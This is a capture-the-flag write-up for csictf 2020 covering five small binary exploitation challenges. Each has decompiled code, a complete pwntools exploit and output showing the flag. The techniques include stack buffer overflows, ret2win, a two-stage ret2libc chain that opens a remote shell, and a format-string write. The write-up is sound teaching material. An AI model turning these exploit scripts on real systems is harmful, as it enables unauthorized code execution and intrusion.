# csictf 2020

# The Small Pwns

Pwns too small for dedicated write-ups.


## Checksec for all binaries

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Or

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

All of these are ripe for BOF and GOT overwrite exploits.


## pwn intended 0x1

Tags: _pwn_ _bof_ _x86-64_

### Analysis

```c
undefined8 main(void)
{
  char local_38 [44];
  int local_c;
  
  local_c = 0;
  puts("Please pour me some coffee:");
  gets(local_38);
  puts("\nThanks!\n");
  if (local_c != 0) {
    puts("Oh no, you spilled some coffee on the floor! Use the flag to clean it.");
    system("cat flag.txt");
  }
  return 0;
}
```

Send 45 bytes for `gets` buffer overflow into `local_c` for the flag.


### Exploit

```python
#!/usr/bin/python3

from pwn import *

p = remote('chall.csivit.com', 30001)
p.sendlineafter('Please pour me some coffee:\n',45 * b'A')
p.interactive()
```

### Output

```bash
 ./exploit.py
[+] Opening connection to chall.csivit.com on port 30001: Done
[*] Switching to interactive mode

Thanks!

Oh no, you spilled some coffee on the floor! Use the flag to clean it.
csictf{y0u_ov3rfl0w3d_th@t_c0ff33_l1ke_@_buff3r}
```


## pwn intended 0x2

Tags: _pwn_ _bof_ _x86-64_

### Analysis

```c
undefined8 main(void)
{
  char local_38 [44];
  int local_c;
  
  local_c = 0;
  puts("Welcome to csictf! Where are you headed?");
  gets(local_38);
  puts("Safe Journey!");
  if (local_c == -0x35014542) {
    puts("You\'ve reached your destination, here\'s a flag!");
    system("/bin/cat flag.txt");
  }
  return 0;
}
```

Send 44 bytes, then `-0x35014542` (`0xcafebabe`) for `gets` buffer overflow into `local_c` for the flag.


### Exploit

```python
#!/usr/bin/python3

from pwn import *

p = remote('chall.csivit.com', 30007)
payload  = 44 * b'A'
payload += p64(0xcafebabe)
p.sendlineafter('Welcome to csictf! Where are you headed?\n',payload)
p.interactive()
```

### Output

```bash
# ./exploit.py
[+] Opening connection to chall.csivit.com on port 30007: Done
[*] Switching to interactive mode
Safe Journey!
You've reached your destination, here's a flag!
csictf{c4n_y0u_re4lly_telep0rt?}
```


## pwn intended 0x3

Tags: _pwn_ _bof_ _ret2win_ _remote-shell_ _got-overwrite_ _x86-64_

### Analysis

```c
undefined8 main(void)
{
  char local_28 [32];
  
  puts("Welcome to csictf! Time to teleport again.");
  gets(local_28);
  return 0;
}

void flag(void)
{
  puts("Well, that was quick. Here\'s your flag:");
  system("cat flag.txt");
  exit(0);
}
```

`gets` buffer overflow `0x28` bytes (`local_28` is `0x28` bytes from return address) + address of `flag` for _ret2win_ _OR_ get a shell.


### Exploit _ret2win_

```python
#!/usr/bin/python3

from pwn import *

binary = ELF('./pwn-intended-0x3')
p = remote('chall.csivit.com', 30013)
payload  = 0x28 * b'A'
payload += p64(binary.sym.flag)
p.sendlineafter('Welcome to csictf! Time to teleport again.\n',payload)
p.interactive()
```

### Output

```bash
# ./exploit.py
[*] '/pwd/datajerk/csictf2020/pwn_intended_0x3/pwn-intended-0x3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to chall.csivit.com on port 30013: Done
[*] Switching to interactive mode
Well, that was quick. Here's your flag:
csictf{ch4lleng1ng_th3_v3ry_l4ws_0f_phys1cs}
```


### Exploit _remote-shell_

> Not required to get the flag, but for the lulz.

```python
!/usr/bin/python3

from pwn import *

binary = ELF('./pwn-intended-0x3')
context.update(arch='amd64',os='linux')

rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

#p = process(binary.path)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = remote('chall.csivit.com', 30013)
libc = ELF('libc-database/db/libc6_2.23-0ubuntu11.2_amd64.so')

payload  = 0x28 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.main)

p.sendlineafter('Welcome to csictf! Time to teleport again.\n',payload)

_ = p.recv(6)
puts = u64(_ + b'\x00\x00')
log.info('puts: ' + hex(puts))
baselibc = puts - libc.sym.puts
log.info('baselibc: ' + hex(baselibc))
libc.address = baselibc

payload  = 0x28 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(libc.search(b"/bin/sh").__next__())
payload += p64(libc.sym.system)

p.sendlineafter('Welcome to csictf! Time to teleport again.\n',payload)
p.interactive()
```

For the first pass, we need to leak a libc address and then _ret2main_ for a second pass.

The remote libc version is not given, so after getting the `puts` libc location libc-database can be used to find the version, e.g.:

```
# libc-database/find puts 6a0 | grep amd64
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu11.2_amd64)
```

For the second pass use `system` to get a shell.


### Output

```bash
# ./exploit.py
[*] '/pwd/datajerk/csictf2020/pwn_intended_0x3/pwn-intended-0x3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loading gadgets for '/pwd/datajerk/csictf2020/pwn_intended_0x3/pwn-intended-0x3'
[+] Opening connection to chall.csivit.com on port 30013: Done
[*] '/pwd/datajerk/csictf2020/pwn_intended_0x3/libc6_2.23-0ubuntu11.2_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] puts: 0x7ff5354226a0
[*] baselibc: 0x7ff5353b3000
[*] Switching to interactive mode
$ ls
bin
dev
flag.txt
lib
lib32
lib64
pwn-intended-0x3
pwn-intended-0x3.c
$ cat flag.txt
csictf{ch4lleng1ng_th3_v3ry_l4ws_0f_phys1cs}
```


## Secret Society

Tags: _pwn_ _bof_ _x86-64_

### Analysis

Lazily blast 1000 bytes at it.

> Sometimes with these easier tasks you get lucky when just blasting garbage at it.  A common technique used to test for segfaults, but in this case, you get the flag with almost no effort.  Unsure if that was the intent.


### Exploit

```bash
# cyclic 1000 | nc chall.csivit.com 30041
```

Any number > 126 passed to `cyclic` will do.


### Output

```bash
What is the secret phrase?
Shhh... don't tell anyone else about
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaa
apaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabea
abfaabgaa,csivit{Bu!!er_e3pl01ts_ar5_5asy}
```


## Global Warming

Tags: _pwn_ _format-string_ _x86_

### Analysis

```c
undefined4 main(undefined1 param_1)
{
  char local_410 [1024];
  undefined1 *local_10;
  
  local_10 = &param_1;
  fgets(local_410,0x400,stdin);
  login(&DAT_0804a030,local_410);
  return 0;
}

void login(undefined4 param_1,char *param_2)
{
  printf(param_2);
  if (admin == -0x4b24541d)
    system("cat flag.txt");
  else
    printf("You cannot login as admin.");
  return;
}
```

The `printf` from `login` does not have a format string.  Simply use a format-string exploit to change the global `admin` to `-0x4b24541d` (`0xb4dbabe3`).


### Exploit

```python
#!/usr/bin/python3

from pwn import *

binary = ELF('./global-warming')
context.update(arch='i386',os='linux')
p = remote('chall.csivit.com', 30023)
offset=12
p.sendline(fmtstr_payload(offset,{binary.sym.admin:p32(0xb4dbabe3)}))
_ = p.recvuntil('}').strip()
flag = _[_.find(b'csictf{'):].decode()
print('\n' + flag + '\n')
```

It is important to set the context to the correct arch when using the pwntools format-string functions.

The `offset` can be quickly found with:

```bash
# echo '%1$p' | nc chall.csivit.com 30023
0xf7f4fff0
```

Just increment the number until the output matches the input, e.g.:

```bash
# echo '%12$p' | nc chall.csivit.com 30023
0x24323125
```

That 4-byte value is actually the string `%12$`, IOW a match and the `offset`.


### Output

```bash
# ./exploit.py
[*] '/pwd/datajerk/csictf2020/global_warming/global-warming'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to chall.csivit.com on port 30023: Done

csictf{n0_5tr1ng5_@tt@ch3d}
```


